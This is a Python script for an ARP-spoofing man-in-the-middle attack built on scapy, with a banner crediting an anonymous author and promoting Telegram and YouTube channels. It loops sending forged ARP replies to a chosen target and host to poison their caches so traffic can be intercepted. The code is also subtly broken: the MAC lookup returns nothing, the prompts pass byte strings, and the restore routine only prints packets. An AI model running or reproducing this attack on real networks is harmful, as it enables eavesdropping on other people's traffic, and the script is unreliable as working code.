# --------- MODULES -------#
from re import I
import time
from matplotlib.pyplot import sca
import scapy.all as scapy
from colorama import Fore
import sys
# -------------------------#


# ---------------------------------- * BANNER * ----------------------------------------------------#
print(Fore.CYAN,"""

..######..########...#######...#######..########.########.########.....##.....##....###....##....##
.##....##.##.....##.##.....##.##.....##.##.......##.......##.....##....###...###...##.##...###...##
.##.......##.....##.##.....##.##.....##.##.......##.......##.....##....####.####..##...##..####..##
..######..########..##.....##.##.....##.######...######...########.....##.###.##.##.....##.##.##.##
.......##.##........##.....##.##.....##.##.......##.......##...##......##.....##.#########.##..####
.##....##.##........##.....##.##.....##.##.......##.......##....##.....##.....##.##.....##.##...###
..######..##.........#######...#######..##.......########.##.....##....##.....##.##.....##.##....##                                                                                                 
# ------------------------------  * INFO * ----------------------------------- #
 PROGRAMMER: ANONYMOUS
 OUR TELEGRAM CHANNEL: https://t.me/ANONYMOU52021
 OUR YOUTUBE CHANNEL: https://www.youtube.com/channel/UCU-xQ_Z1_HkaZSm-Z9jOs9g
# ---------------------------------------------------------------------------- #
""")

# ---------------------------------------------------------------------------------------------------#


# ------------------------ * GET MAC * --------------------------------#
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/arp_request
    send_request = scapy.srp(broadcast, timeout=1, verbose=False)[0]
    #arp_request.show()
    #rp_request.summary()
    #print(Fore.RED,"[*]The Target Ip Address: ",ip)
    #print("Looking For Mac...")
    #time.sleep(0.5)
    #print(Fore.YELLOW ,"[+]Mac Adderess Found! : " ,send_request[0][1].hwsrc)
# ---------------------------------------------------------------------#

#get_mac("192.168.1.1")


# ------------------------ * ARP RESPONSE * ------------------------ #
target_ip = input(b"Enter your target Ip Address: ")
spoofer_ip = input(b"Enter the your Ip to Spoof")

def spoofer(target_ip, spoofer_ip):
    mac_target = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_target, psrc=spoofer_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    destinition_mac = get_mac(dst_ip)
    sources_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=destinition_mac, psrc=src_ip, hwsrc=sources_mac)
    print(packet.show())
    print(packet.summary())

restore(target_ip, spoofer_ip)
# ------------------------------------------------------------------------#



# -------------------- * ERROR HANDELING & LOOPS * -----------------------#
packet_sent_counter = 0
try:
 while True:
     spoofer(target_ip, spoofer_ip)
     spoofer(spoofer_ip, target_ip)
     packet_sent_counter = packet_sent_counter + 2
     time.sleep(1)
     print(Fore.YELLOW ,"[*]Packet Sent: ", str(packet_sent_counter))
    

except KeyboardInterrupt:
    print("[*]Detecting CTRL + C In Programm, Exiting...")

# --------------------------------------------------------------------------#